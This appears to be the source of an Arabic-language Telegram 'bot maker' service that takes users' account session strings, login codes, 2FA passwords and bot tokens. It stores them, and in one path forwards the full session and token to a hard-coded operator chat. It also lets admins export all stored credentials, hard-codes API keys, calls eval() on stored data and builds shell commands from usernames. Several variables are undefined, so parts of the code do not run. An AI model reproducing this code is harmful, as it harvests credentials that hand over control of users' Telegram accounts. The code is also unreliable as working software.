import os
import pyrogram
import redis, re
import asyncio
from pyrogram import Client, idle
from pyrogram import Client as app
from pyrogram import Client, filters
from pyrogram import Client as Client1
from pyrogram.errors import ApiIdInvalid as ApiIdInvalid1
from pyrogram.errors import PasswordHashInvalid as PasswordHashInvalid1
from pyrogram.errors import PhoneCodeExpired as PhoneCodeExpired1
from pyrogram.errors import PhoneCodeInvalid as PhoneCodeInvalid1
from pyrogram.errors import PhoneNumberInvalid as PhoneNumberInvalid1
from pyrogram.errors import SessionPasswordNeeded as SessionPasswordNeeded1
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from pyrogram.errors import (
    ApiIdInvalid,
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from pyromod import listen
from pyrogram import Client, filters
from pyrogram import Client as app
from pyrogram.raw.types import InputPeerChannel
from pyrogram.raw.functions.phone import CreateGroupCall
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, ChatPrivileges
from pyrogram.enums import ChatType
import asyncio
import random
from bot import DEVS


r = redis.Redis(
    host="127.0.0.1",
    port=6379,)

API_ID = int("22358868")
API_HASH = "63ce9d714e685b721ee2fa5e0ea06a5a"
Bots = []
Musi = []
FR3ON = [] 
off =None
ch = "CU_FG"

@app.on_message(filters.private)
async def me(client, message):
   if off:
    if not message.from_user.username in DEVS:
     return await message.reply_text("**★ الصانع معطل من قبل مبرمج السورس\n جاك باشا  @wvvwv3**")
   try:
      await client.get_chat_member(ch, message.from_user.id)
   except:
      return await message.reply_text(f"يجب ان تشترك ف قناة السورس أولا \n https://t.me/{ch}")
   message.continue_propagation()
   
    
@app.on_message(filters.command(["• سورس •"], ""))
async def alivehi(client: Client, message):
    if message.from_user.username in FR3ON:
        return
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("𝐆 𝐀 𝐊 - مــانــدو", url=f"https://t.me/wvvwv3"),
            ],[    
                InlineKeyboardButton("𝗦َ𝗢َ𝗨َ𝗥َ𝗖َ𝗘Jak", url=f"https://t.me/CU_FG"),
            ],
        ]
    )

    await message.reply_photo(
        photo="https://t.me/WMWBKL/13",
        caption=" 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚃𝙴𝙻𝙴𝚃𝙷𝙾𝙽 𝙴𝙻 𝙼𝙰𝚁𝙳\n• 𝚝𝚑𝚎 𝚘𝚏𝚏𝚒𝚌𝚒𝚊𝚕 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼\n• 𝚃𝙷𝙸𝚂 𝙿𝙻𝙰𝙽𝚃 𝙸𝚂 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙻𝚈 𝙵𝚁𝙴𝙴",
        reply_markup=keyboard,
    )

@Client.on_message(filters.command(["• استخراج جلسه •"], ""))
async def alihivehi(client: Client, message):
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("استخرج جلسه بيلجرام", url="https://telegram.tools/session-string-generator#pyrogram,user"),
            ],
        ]
    )

    await message.reply_video(
        video="https://t.me/WMWBKL/21",
        caption="""المستخدم فس الشرح

**API ID 👇 اضغط للنسخ**

.          `22358868`

**API hash 👇 اضغط للنسخ**

`63ce9d714e685b721ee2fa5e0ea06a5a`""",
        reply_markup=keyboard
    )
        
@Client.on_message(filters.command(["• مطور السورس •"], ""))
async def caesar(client: Client, message):
    user = await client.get_chat("wvvwv3")  # استبدل باليوزر المطلوب
    name = user.first_name
    username = user.username
    bio = user.bio
    user_id = user.id
    photo = user.photo.big_file_id
    photo = await client.download_media(photo)

    await message.reply_photo(
        photo=photo,
        caption=f"**Developer Name : {name}** \n**Developer Username : @{username}**\n**{bio}**",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]
        ),
    )    

@Client.on_message(filters.command(["• جاك •"], ""))
async def caesklar(client: Client, message):
    user = await client.get_chat("wvvwv3")  # استبدل باليوزر المطلوب
    name = user.first_name
    username = user.username
    bio = user.bio
    user_id = user.id
    photo = user.photo.big_file_id
    photo = await client.download_media(photo)

    await message.reply_photo(
        photo=photo,
        caption=f"**Developer Name : {name}** \n**Developer Username : @{username}**\n**{bio}**",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]
        ),
    )
    
@app.on_message(filters.command(["• تفعيل المجاني •", "• تعطيل المجاني •"], "") & filters.private)
async def onoff(client, message):
  if not message.from_user.username in DEVS:
    return
  global off
  if message.text == "• تفعيل المجاني •":
    off = None
    return await message.reply_text("تم تفعيل المجاني بنجاح .")
  else:
    off = True
    await message.reply_text("تم تعطيل المجاني بنجاح .")


@app.on_message(filters.command("• صنع بوت •", "") & filters.private)
async def mamhcmfbjvbie(client, message):
    if not message.from_user.username in DEVS:
        if message.from_user.username in FR3ON:
            return        
        for x in get_Bots():
            if x[1] == message.from_user.id:
                return await message.reply_text("لقد قمت بصنع بوت من قبل.")
        if len(get_Bots()) >= MAX_BOTS:
            return await message.reply_text("الصانع مكتمل يحبيبي 😂♥")
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("• بدء التنصيب •", callback_data="ahmed1")]])
    h = await message.reply_text("- اهلا بك في صانع التليثون ⚡ .\n- قم بإستخراج جلسة بايروجرام ⚡ .\n- ثم قم ببدء التنصيب ⚡ .", reply_markup=keyboard)
    await asyncio.sleep(120)
    await h.delete()

@app.on_callback_query(filters.regex(pattern=r"^(FR3ON1|ahmed1)$"))
async def admin_risghts(client: Client, CallbackQuery):
   command = CallbackQuery.matches[0].group(1)
   chat_id = CallbackQuery.message.chat.id
   if command == "FR3ON1":
    blal = await client.ask(chat_id, "ارسل رقم الحساب المساعد بكود الدوله \n مثلا: \n مصر:  +20 \n +201010294706", timeout=200)
    ahmedhm = blal.text
    await CallbackQuery.message.reply_text("انتظر جاري ارسال الكود")
    cliehnt = Client(name="hfhg", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await cliehnt.connect()
    try:
        code = await cliehnt.send_code(ahmedhm)
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        return
    lolo = await client.ask(chat_id, "تم ارسال الكود الي الحساب المساعد قم بارسال الكود المكون من 5 ارقم مبين كل رقم مسافه \n مثلا : \n 1 2 3 4 5", timeout=200)
    hoam = lolo.text  
    try:
        await cliehnt.sign_in(ahmedhm, code.phone_code_hash, hoam)
    except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
        await CallbackQuery.message.reply_text("الكود غير صحيح او انتهي صلاحيه الكود")
        return
    except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
        await CallbackQuery.message.reply_text("الكود غير صحيح او انتهي صلاحيه الكود")
        return
    except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
        mmh = await client.ask(chat_id, "الحساب محمي بكلمه سر ارسل كلمه السر الان (رمز التحقق)", timeout=200)
        await asyncio.sleep(3)
        hm = mmh.text
        try:
            await cliehnt.check_password(password=hm)
            string_session = await cliehnt.export_session_string()
        except:
            await CallbackQuery.message.reply_text("كلمه السر غير صحيحه جرب مره اخرى")
            return  
    else:
        string_session = await cliehnt.export_session_string()
    await cliehnt.disconnect()
    ahsk = await client.ask(chat_id, "ارسل توكن البوت الذى تم استخراجه من بوت فاذر @BotFather", timeout=200)
    await asyncio.sleep(3)
    TOKEN = ahsk.text 
    SESSION = string_session
    Dev = CallbackQuery.message.chat.id    
    if CallbackQuery.from_user.username in DEVS:
        ahjusk = await client.ask(chat_id, "ارسل ايدي المطور", timeout=200)
        await asyncio.sleep(3)
        try:
            Dev = int(ahjusk.text)
        except:
            return await CallbackQuery.message.reply_text("قم بارسال الايدي بشكل صحيح")   
    try:
      bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
      await bot.start()
    except Exception as es:
      return await CallbackQuery.message.reply_text("**التوكن غير صحيح 🚦**")
    bot_i = await bot.get_me()
    FR3O = bot_i.username
    CAGHSR = bot_i.first_name
    logger = CallbackQuery.from_user.id
    try:
       user = Client("FR3ON", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)       
       await user.start()
    except:
       await bot.stop()
       return await CallbackQuery.message.reply_text(f"**كود الجلسه غير صالح ⚡**")
    id = CallbackQuery.from_user.username
    await bot.stop()
    await user.stop()
    for x in get_Bots():
        if x[0] == FR3O:
            return await CallbackQuery.message.reply_text("لقد قمت بصنع هذا البوت من قبل . ")
    oo = [FR3O, Dev, TOKEN, SESSION]
    add_Bots(oo)    
    await CallbackQuery.message.reply_text(f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{FR3O}\n\n بواسطة @{id}\nتوكن البوت :`{TOKEN}`\nجلسه الحساب : `{SESSION}`")
    await client.send_message(chat_id=FR3ONid, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{FR3O}\n\n بواسطة @{id}\nتوكن البوت :`{TOKEN}`\nجلسه الحساب : `{SESSION}`")   
    try:
     await start_bot(client, CallbackQuery)
    except:
     pass
   if command == "ahmed1":
    ahsufbsk = await client.ask(chat_id, "حسنا قم بالرسال الجلسه ", timeout=200)
    await asyncio.sleep(3)
    SESSION = ahsufbsk.text
    as5k = await client.ask(chat_id, "ارسل توكن البوت الان وفى حاله عدم وجود توكن استخرج توكن من هنا @BotFather", timeout=200)
    await asyncio.sleep(3)
    TOKEN = as5k.text         
    Dev = CallbackQuery.message.chat.id    
    if CallbackQuery.from_user.username in DEVS:
        ahjusk = await client.ask(chat_id, "ارسل ايدي المطور", timeout=200)
        try:
            Dev = int(ahjusk.text)
        except:
            return await CallbackQuery.message.reply_text("قم بارسال الايدي بشكل صحيح")   
    try:
      bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
      await bot.start()
    except Exception as es:
      return await CallbackQuery.message.reply_text("**التوكن غير صحيح 🚦**")
    bot_i = await bot.get_me()
    FR3O = bot_i.username
    CAGHSR = bot_i.first_name
    logger = CallbackQuery.from_user.id
    try:
       user = Client("FR3ON", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)       
       await user.start()
    except:
       await bot.stop()
       return await CallbackQuery.message.reply_text(f"**كود الجلسه غير صالح استخرج جلسه بايروجرام**")
    id = CallbackQuery.from_user.username
    await bot.stop()
    await user.stop()
    for x in get_Bots():
        if x[0] == FR3O:
            return await CallbackQuery.message.reply_text("لقد قمت بصنع هذا البوت من قبل . ")
    os.system(f"cp -a source users/{FR3O}")
    env = open(f"users/{FR3O}/config.py", "w+", encoding="utf-8")
    x = f'from pytgcalls import PyTgCalls\nfrom pyrogram import Client,filters,enums\nimport redis\n\nr = redis.Redis(host="127.0.0.1", port=6379, charset="utf-8", decode_responses=True)\n\nsudo_id = {Dev} \nbot_user = "{FR3O}"\napi_id = 10823881\napi_hash = "339886e2109eb67203ce12022b32e035"\nsession = "{SESSION}"\ntoken = "{TOKEN}"\nsudo_command = [7157276873]\npm = "{logger}"\nmention = "{logger}"\nplugins = dict(root="plugins")\napp = Client("user:{FR3O}",api_id , api_hash ,in_memory=True,session_string = session,plugins=plugins)\nbot = Client("{FR3O}",api_id=api_id , api_hash=api_hash ,bot_token=token,plugins=dict(root="plug_bot"))\nhoss = PyTgCalls(app, cache_duration=100)'
    env.write(x)
    env.close()
    os.system(f"cd users/{FR3O} && screen -d -m -S {FR3O} python3 user.py")
    oo = [FR3O, Dev, TOKEN, SESSION]
    add_Bots(oo)
    await CallbackQuery.message.reply_text(f"✨ تم صنع بوتك بنجاح \nيوزر البوت : @{FR3O}\n\n بواسطة @{id} ")
    await client.send_message(chat_id=7157276873, text=f"✨ تم صنع بوتك بنجاح \nيوزر البوت : @{FR3O}\n\n بواسطة @{id}")   
    try:
     await start_bot(client, CallbackQuery)
    except:
     pass
     
     
appp = {} 

@app.on_message(filters.command("تشغيل جميع البوتات", ""))
async def botzbjbbojbfbvfhmbie(client, message):
    if not message.from_user.username in DEVS:
        return
    await message.reply_text("**جاري تشغيل جميع البوتات ..◐**")
    o = 0
    for x in get_Bots():
        o += 1
        bot_username = x[0]
        dev_id = x[1]
        user = await client.get_users(dev_id)
        user = user.username
        TOKEN = x[2]
        SESSION = x[3]
        logger = x[4]
        bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        try:
            await bot.start()
        except Exception as e:
            await client.send_message(message.chat.id, f"فشل في تشغيل هذا البوت : @{bot_username}")
        await bot.stop()
        os.system(f"cp -a source users/{bot_username}")
        env = open(f"users/{bot_username}/config.py", "w+", encoding="utf-8")
        x = f'from pytgcalls import PyTgCalls\nfrom pyrogram import Client,filters,enums\nimport redis\n\nr = redis.Redis(host="127.0.0.1", port=6379, charset="utf-8", decode_responses=True)\n\nsudo_id = {Dev} \nbot_user = "{FR3O}"\napi_id = 10823881\napi_hash = "339886e2109eb67203ce12022b32e035"\nsession = "{SESSION}"\ntoken = "{TOKEN}"\nsudo_command = [7157276873]\npm = "{logger}"\nmention = "{logger}"\nplugins = dict(root="plugins")\napp = Client("user:{FR3O}",api_id , api_hash ,in_memory=True,session_string = session,plugins=plugins)\nbot = Client("{FR3O}",api_id=api_id , api_hash=api_hash ,bot_token=token,plugins=dict(root="plug_bot"))\nhoss = PyTgCalls(app, cache_duration=100)'
        env.write(x)
        env.close()
        os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 user.py")
    if o == 0:
        return await message.reply_text("لا يوجد بوتات لتشغيلها")
    await message.reply_text(f"تم تشغيل جميع البوتات بنجاح ✨♥ \n وعددهم [{o}]")

@app.on_message(filters.command("ايقاف جميع البوتات", ""))
async def hos(client, message):
    if not message.from_user.username in DEVS:
        return
    await message.reply_text("**جاري ايقاف جميع البوتات ..◐**")
    o = 0
    for x in get_Bots():
        o += 1
        bot_username = x[0]
        dev_id = x[1]
        user = await client.get_users(dev_id)
        user = user.username
        os.system(f"sudo rm -fr users/{bot_username}")
        os.system(f"screen -XS {bot_username} quit")
    if o == 0:
        return await message.reply_text("لا يوجد بوتات ايقافها")
    await message.reply_text(f"تم ايقاف جميع البوتات بنجاح ✨♥ \n وعددهم [{o}]")

@app.on_message(filters.command("حذف جميع البوتات", ""))
async def ahmedGM(client, message):
    if not message.from_user.username in DEVS:
        return
    await message.reply_text("**جاري حذف جميع البوتات ..◐**")
    o = 0
    for x in get_Bots():
        o += 1
        bot_username = x[0]
        dev_id = x[1]
        user = await client.get_users(dev_id)
        user = user.username
        os.system(f"sudo rm -fr users/{bot_username}")
        os.system(f"screen -XS {bot_username} quit")
        del_Bots(x)
    if o == 0:
        return await message.reply_text("لا يوجد بوتات لحذفها")
    await message.reply_text(f"تم حذف جميع البوتات بنجاح ✨♥ \n وعددهم [{o}]")
    
@Client.on_message(filters.command("تحديث جميع البوتات", ""))
async def ahmedhmGM(client, message):
    if not message.from_user.username in DEVS:
        return
    await message.reply_text("**جاري تحديث جميع البوتات ..◐**")
    o = 0
    for x in get_Bots():
        o += 1
        bot_username = x[0]
        dev_id = x[1]
        user = await client.get_users(dev_id)
        user = user.username
        TOKEN = x[2]
        SESSION = x[3]
        logger = x[4]
        os.system(f"sudo rm -fr users/{bot_username}")
        os.system(f"screen -XS {bot_username} quit")
        bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        try:
            await bot.start()
        except Exception as e:
            await client.send_message(message.chat.id, f"فشل في تشغيل هذا البوت : @{bot_username}")
        await bot.stop()
        os.system(f"cp -a source users/{bot_username}")
        env = open(f"users/{bot_username}/config.py", "w+", encoding="utf-8")
        x = f'from pytgcalls import PyTgCalls\nfrom pyrogram import Client,filters,enums\nimport redis\n\nr = redis.Redis(host="127.0.0.1", port=6379, charset="utf-8", decode_responses=True)\n\nsudo_id = {Dev} \nbot_user = "{FR3O}"\napi_id = 10823881\napi_hash = "339886e2109eb67203ce12022b32e035"\nsession = "{SESSION}"\ntoken = "{TOKEN}"\nsudo_command = [7157276873]\npm = "{logger}"\nmention = "{logger}"\nplugins = dict(root="plugins")\napp = Client("user:{FR3O}",api_id , api_hash ,in_memory=True,session_string = session,plugins=plugins)\nbot = Client("{FR3O}",api_id=api_id , api_hash=api_hash ,bot_token=token,plugins=dict(root="plug_bot"))\nhoss = PyTgCalls(app, cache_duration=100)'
        env.write(x)
        env.close()
        os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 user.py")
    if o == 0:
        return await message.reply_text("لا يوجد بوتات لتحديثها")
    await message.reply_text(f"تم تحديث جميع البوتات بنجاح ✨♥ \n وعددهم [{o}]")

@app.on_message(filters.command("رفع البوتات", ""))
async def botzbjhfhfbbojfhmbie(client, message):
    if not message.from_user.username in DEVS:
        return
    if message.reply_to_message:
        if message.reply_to_message.document.file_name.endswith("txt"):
            wait = await message.reply("◐ انتظر قليلا ..", quote=True)
            await message.reply_to_message.download("./Bots.txt")                
            try:
                file = open("Bots.txt", "r").readlines()
            except FileNotFoundError:
                await message.reply("حدث خطأ أثناء فتح الملف.", quote=True)
                return                    
            for line in file:
                bots = line.strip()
                add_Bots(bots)                   
            await message.reply("تم رفع البوتات بنجاح ✨♥")
    
def add_Bots(bots):
    if is_Bots(bots):
        return
    r.sadd("hods", str(bots))

def is_Bots(bots):
    try:
        a = get_Bots()
        if bots in a:
            return True
        return False
    except:
        return False

def del_Bots(bots):
    if not is_Bots(bots):
        return False
    r.srem("hods", str(bots))

def get_Bots():
    try:
        lst = []
        for a in r.smembers("hods"):
            lst.append(eval(a.decode('utf-8')))
        return lst
    except:
        return []

def get_Bots_backup(): 
	text = ''
	for bots in r.smembers(f"hods"):
		text += bots.decode('utf-8')+'\n'
	with open('Bots.txt', 'w+') as f:
		f.write(text)
	return 'Bots.txt'

@app.on_message(filters.command("جلب البوتات", ""))
async def botzbjhfhfbhgbojfhmbie(client, message):
    if not message.from_user.username in DEVS:
        return
    await message.reply_document(get_Bots_backup())
    
@app.on_message(filters.command("• البوتات المصنوعه •", ""))
async def botzbjbbojfhmbie(client, message):
    if not message.from_user.username in DEVS:
        return
    o = 0
    text = "قائمة البوتات\n"
    for x in get_Bots():
        o += 1
        bot_username = x[0]
        dev_id = x[1]
        user = await client.get_users(dev_id)
        user = user.username
        text += f"{o}- @{bot_username}: @{user}\n"
    if o == 0:
        return await message.reply_text("لا يوجد بوتات مصنوعة")
    await message.reply_text(text)
    
@app.on_message(filters.command(["اذاعه لمطورين البوتات"], ""))
async def cast_dev(client, message):
 if not message.from_user.username in DEVS:
        return
 ask = await client.ask(message.chat.id, "**قم بارسال الاذاعه الان**", timeout=300)
 if ask.text == "الغاء":
     return await ask.reply_text("تم الالغاء")
 d = 0
 f = 0
 bots = get_Bots()
 for i in bots:
     try:
      dev = i[1]
      bot_username = i[0]
      bot = appp[bot_username]
      try: 
        await bot.send_message(dev, ask.text)
        d += 1
      except Exception as es:
       print(es)
       f += 1
     except Exception:
      f += 1
 return await ask.reply_text(f"**تم الارسال الي {d} مطور\n**وفشل الارسال الي {f} مطور**")
      
@app.on_message(filters.command(["ايقاف بوت"],""))
async def FR3ONgd(client, message):
    if not message.from_user.username in DEVS:
        return
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
    except:
        return
    bot_username = bot.text.replace("@", "")
    for x in get_Bots():
        if x[0] == bot_username:
          dev_id = x[1]
          user = await client.get_users(dev_id)
          user = user.username
          os.system(f"screen -XS {bot_username} quit")
    await message.reply_text("تم ايقاف البوت بنجاح")

@app.on_message(filters.command(["تشغيل بوت"],""))
async def FR3Ogd(client, message):
    if not message.from_user.username in DEVS:
        return
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
    except:
        return
    bot_username = bot.text.replace("@", "")
    for x in get_Bots():
        if x[0] == bot_username:
          dev_id = x[1]
          user = await client.get_users(dev_id)
          user = user.username
          TOKEN = x[2]
          SESSION = x[3]
          logger = x[4]
          bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
          try:
              await bot.start()
          except Exception as e:
              await client.send_message(message.chat.id, f"فشل في تشغيل هذا البوت : @{bot_username}")
          await bot.stop()
          os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 user.py")
    await message.reply_text("تم تشغيل البوت بنجاح")

@app.on_message(filters.command(["اعاده تشغيل بوت"],""))
async def CARgd(client, message):
    if not message.from_user.username in DEVS:
        return
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
    except:
        return
    bot_username = bot.text.replace("@", "")
    for x in get_Bots():
        if x[0] == bot_username:
          dev_id = x[1]
          user = await client.get_users(dev_id)
          user = user.username
          TOKEN = x[2]
          SESSION = x[3]
          logger = x[4]
          os.system(f"sudo rm -fr users/{bot_username}")
          os.system(f"screen -XS {bot_username} quit")
          os.system(f"cp -a source users/{bot_username}")
          env = open(f"users/{bot_username}/config.py", "w+", encoding="utf-8")
          x = f'from pytgcalls import PyTgCalls\nfrom pyrogram import Client,filters,enums\nimport redis\n\nr = redis.Redis(host="127.0.0.1", port=6379, charset="utf-8", decode_responses=True)\n\nsudo_id = {Dev} \nbot_user = "{FR3O}"\napi_id = 10823881\napi_hash = "339886e2109eb67203ce12022b32e035"\nsession = "{SESSION}"\ntoken = "{TOKEN}"\nsudo_command = [7157276873]\npm = "{logger}"\nmention = "{logger}"\nplugins = dict(root="plugins")\napp = Client("user:{FR3O}",api_id , api_hash ,in_memory=True,session_string = session,plugins=plugins)\nbot = Client("{FR3O}",api_id=api_id , api_hash=api_hash ,bot_token=token,plugins=dict(root="plug_bot"))\nhoss = PyTgCalls(app, cache_duration=100)'
          env.write(x)
          env.close()
          bot = Client("ahmed", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
          try:
              await bot.start()
          except Exception as e:
              await client.send_message(message.chat.id, f"فشل في اعاده تشغيل هذا البوت : @{bot_username}")
          await bot.stop()
          os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 user.py")
    await message.reply_text("تم تشغيل البوت بنجاح")
   
@app.on_message(filters.command("• حذف بوت •", "") & filters.private)
async def delete_bot_zombie(client, message):
    if not message.from_user.username in DEVS:
        if message.from_user.username in FR3ON:
            return
        for x in get_Bots():
            bot_username = x[0]
            if x[1] == message.from_user.id:
                dev_id = x[1]
                user = await client.get_users(dev_id)
                user = user.username
                os.system(f"sudo rm -fr users/{bot_username}")
                os.system(f"screen -XS {bot_username} quit")
                del_Bots(x)
                return await message.reply_text("تم حذف بوتك من الصانع.")
        return await message.reply_text("لم تقم بصنع بوتات")
    try:
        bot = await client.ask(message.chat.id, "هات يوزر البوت", timeout=200)
    except:
        return
    bot_username = bot.text.replace("@", "")
    for x in get_Bots():
        if x[0] == bot_username:
            dev_id = x[1]
            user = await client.get_users(dev_id)
            user = user.username
            os.system(f"sudo rm -fr users/{bot_username}")
            os.system(f"screen -XS {bot_username} quit")
            del_Bots(x)
    await message.reply_text("تم حذف البوت بنجاح")
@app.on_message(filters.command("تعيين عدد المصنوعات", ""))
async def set_bot_limit(client, message):
    if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
        return
    
    ask = await client.ask(message.chat.id, "• أرسل الآن الحد الأقصى لعدد البوتات المراد تعيينه", timeout=300)
    
    if not ask.text.isdigit():
        return await message.reply_text("• يرجى ارسال ارقام")
    
    max_bots = int(ask.text)
    
    global MAX_BOTS
    MAX_BOTS = max_bots
    
    await message.reply_text(f"• تم تعيين الحد الاقصي لعدد البوتات الي : ⟨ {max_bots} ⟩")  
@app.on_message(filters.command("حظر مستخدم", "") & filters.private)
async def mazojgvmhxjfbbie(client, message):
  if not message.from_user.username in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "ارسل يوزر المستخدم", timeout=300)
  except:
      return    
  SHDHE = ask.text.replace("@", "")
  FR3ON.append(SHDHE)
  await client.send_message(message.chat.id, "تم حظر المستخدم بنجاح")
            
@app.on_message(filters.command("المحظورين", "") & filters.private)
async def getbannbvnbjfedjcjgusers(client, message):
  if not message.from_user.username in DEVS:
    return
  fraonr = "قائمة المستخدمين المحظورين:\n\n"
  for username in FR3ON:
      fraonr += f"- @{username}\n" 
  await client.send_message(message.chat.id, fraonr)
  
@app.on_message(filters.command("الغاء حظر مستخدم", "") & filters.private)
async def unbanncgdj_bb_user(client, message):
  if not message.from_user.username in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "ارسل يوزر المطور", timeout=300)
  except:
      return    
  SHFE = ask.text.replace("@", "")
  if SHFE in FR3ON:
      FR3ON.remove(SHFE)
      await client.send_message(message.chat.id, "تم إلغاء حظر المستخدم بنجاح")
  else:
      await client.send_message(message.chat.id, "لا يوجد حظر لهذا المستخدم")
    
@app.on_message(filters.command("رفع مطور", "") & filters.private)
async def mazojgvmbie(client, message):
  if not message.from_user.username in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "ارسل يوزر المطور", timeout=300)
  except:
      return    
  SE = ask.text.replace("@", "")
  DEVS.append(SE)
  await client.send_message(message.chat.id, "تم رفع المطور بنجاح")
            
@app.on_message(filters.command("المطورين", "") & filters.private)
async def getbannbvnbedusers(client, message):
  if not message.from_user.username in DEVS:
    return
  fraonr = "قائمة المطورين:\n\n"
  for username in DEVS:
      fraonr += f"- @{username}\n" 
  await client.send_message(message.chat.id, fraonr)
  
@app.on_message(filters.command("تنزيل مطور", "") & filters.private)
async def unbanncbb_user(client, message):
  if not message.from_user.username in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "ارسل يوزر المطور", timeout=300)
  except:
      return    
  SE = ask.text.replace("@", "")
  if SE in DEVS:
      DEVS.remove(SE)
      await client.send_message(message.chat.id, "تم تنزيل المطور بنجاح")
  else:
      await client.send_message(message.chat.id, "اليوزر ليس لمطور في الصانع")
  
@app.on_message(filters.command("◐ قسم البوتات ◐", ""))
async def botstatfhjfgvhfus(client, message):
    if not message.from_user.username in DEVS:
        return
    kep = ReplyKeyboardMarkup([["• صنع بوت •", "• حذف بوت •"], ["ايقاف بوت", "تشغيل بوت"], ["اعاده تشغيل بوت"], ["• البوتات المصنوعه •"], ["اذاعه لمطورين البوتات"], ["تشغيل جميع البوتات", "ايقاف جميع البوتات"], ["رفع البوتات", "جلب البوتات"], ["حذف جميع البوتات", "تحديث جميع البوتات"], ["رجوع"]], resize_keyboard=True)
    await message.reply_text("╮⦿ اهـلا بڪ عزيـزي المطـور الاساسـي \n│⎋ اليك قسم البوتات\n╯⦿ في صانع التليثون الخاص ", reply_markup=kep)
    
@app.on_message(filters.command("◐ التفعيل والتعطيل ◐", ""))
async def gvhfghfvsus(client, message):
    if not message.from_user.username in DEVS:
        return
    kep = ReplyKeyboardMarkup([["• تفعيل المجاني •", "• تعطيل المجاني •"], ["تفعيل التواصل", "تعطيل التواصل"], ["رجوع"]], resize_keyboard=True)
    await message.reply_text("╮⦿ اهـلا بڪ عزيـزي المطـور الاساسـي \n│⎋ اليك قسم التفعيل والتعطيل\n╯⦿ في صانع التليثون الخاص ", reply_markup=kep)

@app.on_message(filters.command("◐ تحكم الصانع ◐", ""))
async def gvhfbcfvjgbus(client, message):
    if not message.from_user.username in DEVS:
        return
    kep = ReplyKeyboardMarkup([["الغاء حظر مستخدم", "حظر مستخدم"], ["المحظورين"], ["رفع مطور", "تنزيل مطور"], ["المطورين"], ["الاحصائيات"], ["اذاعة بالتوجيه", "اذاعة", "اذاعة بالتثبيت"], ["قائمه الأدمنيه", "رفع ادمن", "تنزيل ادمن"], ["رجوع"]], resize_keyboard=True)
    await message.reply_text("╮⦿ اهـلا بڪ عزيـزي المطـور الاساسـي \n│⎋ اليك قسم تحكم الصانع\n╯⦿ في صانع التليثون الخاص ", reply_markup=kep)
